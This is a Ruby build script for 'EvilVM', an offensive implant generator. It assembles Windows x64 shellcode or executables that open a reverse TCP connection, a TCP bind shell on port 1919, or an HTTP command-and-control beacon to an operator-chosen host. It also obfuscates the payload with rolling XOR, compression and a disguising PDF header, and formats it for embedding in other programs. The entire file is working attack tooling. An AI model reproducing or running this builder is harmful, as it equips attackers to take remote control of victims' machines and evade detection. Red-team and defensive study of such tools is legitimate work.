#!/usr/bin/env ruby

# encoding stuff in Ruby is crazy, so as you encode and encapsulate
# your payload, you'll get incorrect byte lengths.  This guarantees
# that no multi-byte sequences ever pollute your strings

Encoding.default_external = 'ASCII'

$root = File.expand_path(File.dirname(__FILE__))

require 'yaml'
require 'base64'
require 'tempfile'
require 'optparse'
require 'pp'

module EvilVM

  #
  # Profiles govern how the assembler will be configured.  Primarily
  # it involves choosing the -D* flags to conditionally enable or
  # disable features in the shellcode.
  #
  
  class BaseProfile
    attr_accessor :flags
    def initialize
      @flags = [ "-DIOSTD" ]
    end
  end
  
  class NetProfile < BaseProfile
    def initialize(ip, port)
      super()
      @flags = [
        "-DIONET",
        "-DIPADDR=#{ip.split(/\./).join(",")}",
        "-DPORT=#{port}"]
    end

    def connectwait=(val)
      @flags << "-DCONNECTWAIT=#{val}"
    end
  end

  class BindProfile < BaseProfile
    def initialize(ip, port)
      super()
      @flags = [
        "-DIOBIND",
        "-DIPADDR=#{ip.split(/\./).join(",")}",
        "-DPORT=#{port}"]
    end
  end

  class HTTPProfile < BaseProfile
    def initialize()
      super()
      @flags = [ "-DIOWININET", "-DADDCRYPTO" ]
    end

    def interval=(val)
      @flags << "-DHTTPINTERVAL=#{val}"
    end

    def port=(val)
      @flags << "-DHTTPPORT=#{val}"
    end

    def uri=(val)
      @flags << "-DHTTPURI=\\\"#{val}\\\""
    end

    def host=(val)
      @flags << "-DHTTPHOST=\\\"#{val}\\\""
    end
  end

  class MemProfile < BaseProfile
    def initialize()
      super()
      @flags = ["-DIOMEM"]
    end
  end

  #
  # Compiler - consume configuration settings for generating an
  # agent, and compile it to the requested form.
  #

  class Compiler
    attr_accessor :shellcode, :binary, :exe, :gcc, :ld, :debug

    def initialize(profile, exe: true)
      @orig_dir = Dir.pwd
      @profile  = profile
      @exe      = exe
      @asm      = "nasm"
      @gcc      = "x86_64-w64-mingw32-gcc"
      @ld       = "x86_64-w64-mingw32-ld"
      @debug    = false
    end

    def assemble
      flags = @profile.flags.join(" ")
      redir = @debug ? "" : "2>/dev/null"
      cmd = "#{@asm} #{flags} main.asm -f bin -o >(cat)' #{redir}"
      puts cmd if @debug
      @shellcode = `bash -c 'cd #$root/agent && #{cmd}`
    end

    def generate(file)
      flags = @profile.flags.join(" ")
      redir = @debug ? "" : "2>/dev/null"
      cmd = "#{@asm} #{flags} main.asm -f win64 -o #{file}' #{redir}"
      puts cmd if @debug
      system("bash -c 'cd #$root/agent && #{cmd}")
    end

    def link
      object = Tempfile.new('object')
      output = Tempfile.new('binary')
      begin
        object.close()
        output.close()
        generate object.path
        system("bash -c '#{@ld} -s #{object.path} -o #{output.path}'")
        @binary = File.read(output.path)
      ensure
        object.unlink
        output.unlink
      end
    end

    def compile
      begin
        Dir.chdir $root
        assemble
        link
      ensure
        Dir.chdir @orig_dir
      end
    end

    def format(shape, format)
      case shape
      when :shellcode
        $stderr.puts("Assembled #{@shellcode.length} bytes of shellcode")
        output = @shellcode
      when :exe
        $stderr.puts("Compiled #{@binary.length} byte binary")
        output = @binary
      else
        $stderr.puts "ERROR: must specify output shape (exe / shellcode / etc.)"
        exit 4
      end

      if format == "binary"
        return output
      elsif format == "base64"
        return Base64::encode64(output).split().join("") + "\n"
      elsif format == "hex"
        return output.unpack("H*")[0] + "\n"
      else
        return format_for_source(output, format)
      end
    end

    def format_for_source(output, format)
      bytes = []
      specs = format_spec(format)
      output.each_byte { |b| bytes << sprintf(specs[:byte], b) }
      rows = []

      bytes.each_slice(specs[:slice]) do |a| 
        rows << specs[:pre] + "#{a.to_a.join(specs[:line])}" + specs[:post]
      end

      output = specs[:def] + rows.join(specs[:ending]) + specs[:suffix]
      return output
    end
    
    def format_spec(format)
      case format
      when "string"
        return { 
          :byte => "\\x%02x", :pre => "\"", :post => "\"",
          :def => "char *code = \n  ", :ending => "\n  ",
          :suffix => " };\n", :slice => 16, :line => "" }
      when "chars"
        return { 
          :byte => "0x%02x", :pre => "", :post => "",
          :def => "char code[] = {\n  ", :ending => ",\n  ",
          :suffix => " };\n", :slice => 12, :line => ", " }
      when "bytes"
        return { 
          :byte => "0x%02x", :pre => "", :post => "",
          :def => "byte code[] = {\n  ", :ending => ",\n  ",
          :suffix => " };\n", :slice => 12, :line => ", "}
      when "escapes"
        return {
          :byte => "\\x%02x", :pre => "", :post => "",
          :def => "", :ending => "", :suffix => "", :slice => 16, :line => ""
        }
      when "asm"
        return { 
          :byte => "0x%02x", :pre => "    db ", :post => "",
          :def => "code:\n  ", :ending => "\n  ",
          :suffix => "\n", :slice => 12, :line => ", "}
      when "ruby"
        return { 
          :byte => "\\x%02x", :pre => "\"", :post => "",
          :def => "code = \n  ", :ending => "\" +\n  ",
          :suffix => "\"\n", :slice => 12, :line => ""}
      else
        print("Unrecognized output format: #{format}")
        exit 5
      end
    end

    def encapsulate(spec)
      fields = spec.split.map { |i| i.strip }
      if fields.member? "list"
        puts("Encapsulation options:\n\n")
        ["compress", "rle", "xor", "pdf"].each { |i| puts i }
        exit 6
      else
        fields.each do |mode|
          begin
            stage = Tempfile.new("stage")
            stage.write(@shellcode)
            stage.close
            case mode
            when "compress"
              STDERR.puts "Encapsulating with repeated QWORD compression"
              cmd = "ruby #{$root}/encapsulation/compress.rb #{stage.path}"
              @shellcode = `#{cmd}`
            when "rle"
              STDERR.puts "RLE encoding NULL bytes in shellcode"
              cmd = "ruby #{$root}/encapsulation/rle-zeros.rb #{stage.path}"
              @shellcode = `#{cmd}`
            when "xor"
              STDERR.puts "Encrypting with rolling XOR"
              cmd = "ruby #{$root}/encapsulation/xor32.rb -k rand < #{stage.path}"
              @shellcode = `#{cmd}`
            when "pdf"
              STDERR.puts "Encapsulating by adding an executable PDF header"
              cmd = "ruby #{$root}/encapsulation/pdf.rb #{stage.path}"
              @shellcode = `#{cmd}`
            end
          ensure
            stage.unlink
          end
        end
      end
    end
  end
end

#
# Practical entrypoint.  Lots of options and configuring is never pretty.
#

if $0 == __FILE__
  options = {
    :shape => :exe,
    :output => "payload.exe",
    :format => "binary"
  }

  ARGV << "-h" if ARGV.length == 0

  OptionParser.new do |opts|
    opts.banner = "\nUsage: build.rb [options]"
    
    opts.separator ""
    opts.separator " Builds an EvilVM agent.  Choose a transport layer, configure it, and determine"
    opts.separator " your preferred output format.  Options are available for convenient insertion"
    opts.separator " into other programs or scripts, raw shellcode generation, or PE executables."

    opts.separator ""
    opts.separator "Payload Transport Layers:"
    opts.on("-n", "--net", "Build network payload") { |p| options[:payload] = :netio }
    opts.on("-s", "--streams", "Build std streams payload") { |p| options[:payload] = :stdio }
    opts.on("-H", "--http", "Build HTTP payload") { |p| options[:payload] = :httpio }
    opts.on("-m", "--memio", "Build shared memory payload") { |p| options[:payload] = :memio }
    opts.on("-b", "--bind", "Build TCP bind payload") { |p| options[:payload] = :bindio }

    opts.separator ""
    opts.separator "Transport Options:"
    opts.on("-u", "--uri URI", "URI (path) for HTTP payloads") { |h| options[:uri] = h }
    opts.on("-i", "--ip IP", "IP for network payloads") { |i| options[:ip] = i }
    opts.on("-p", "--port PORT", "TCP port for network payloads") { |p| options[:port] = p.to_i }
    opts.on("-k", "--key KEY,KEY", "Crypto keys for crypto layer") { |k| options[:keys] = k }
    opts.on("-I", "--interval MS", "Interval for periodic transports") { |i|
      options[:interval] = i.to_i
    }

    opts.separator ""
    opts.separator "Output Options:"

    opts.on("-d", "--debug", "Debug output (troubleshoot assembly)") { |d| 
      options[:debug] = d
    }

    opts.on("-S", "--shellcode", "Output shellcode alone (default)") { |f| 
      options[:shape] = :shellcode 
    }
    
    opts.on("-E", "--exe", "Output executable") { |f| options[:shape] = :exe }

    opts.on("-f", "--format FMT", "Output format ('list' for options)") { |f| 
      options[:format] = f
    }
    
    opts.on("-o", "--output FILE", "File to write payload (or '-' for stdout)") { |o|
      options[:output] = o
    }

    opts.separator ""
    opts.separator "Encapsulation:"

    opts.on("-e", "--encap ENCAP", "Encapsulations ('list' to see options)") { |e|
      options[:encap] = e
    }

    opts.separator ""
    opts.separator "Profile Options:"

    opts.on("-P", "--profile FILE", "Read options from YAML profile") { |p| 
      options[:profile] = p
    }

    opts.on("-W", "--write FILE", "Write options to YAML file (no build)") { |p|
      options[:write] = p
    }

    opts.on("-h", "--help", "This help output") do
      puts opts
      exit 1
    end

    opts.separator ""
  end.parse!

  options = YAML.load(File.read(options[:profile])) if options[:profile]

  if options.key? :write
    file = options[:write]
    options.delete :write
    f = File.open(file, "w")
    f.write YAML.dump(options)
    f.close
    puts("Wrote config to file '#{file}'")
    exit 0
  end

  profile = nil

  options[:format] = "binary" unless options[:format]

  if options[:format] == "list"
    puts "Format options:\n\n"
    puts ["binary (default)", "base64", "hex", "string (C)", "chars (C)", "bytes (C#)", "escapes"].join("\n")
    exit 3
  end

  case options[:payload]
  when :stdio
    profile = EvilVM::BaseProfile.new
  when :netio
    profile = EvilVM::NetProfile.new(options[:ip], options[:port])
    profile.connectwait = options[:interval] || 1000
  when :bindio
    profile = EvilVM::BindProfile.new(options[:ip] || "0.0.0.0", options[:port] || 1919)
  when :httpio
    profile = EvilVM::HTTPProfile.new()
    profile.uri = options[:uri] || "/feed"
    profile.host = options[:ip] || "127.0.0.1"
    profile.port = options[:port] || 1920
    profile.interval = options[:interval] || 5000
  when :memio
    profile = EvilVM::MemProfile.new()
  else
    puts("ERROR: payload must be specified")
    exit 2
  end

  c = EvilVM::Compiler.new(profile)
  c.debug = true if options[:debug]
  c.compile

  c.encapsulate(options[:encap]) if options[:encap]

  output = c.format(options[:shape], options[:format])

  stream = $stdout
  if options[:output] != "-"
    $stderr.puts("Writing to file '#{options[:output]}'")
    stream = File.open(options[:output], "wb")
  end

  $stderr.puts("Writing output of #{output.length} bytes")

  stream.write(output)
  stream.close if stream != $stdout
end
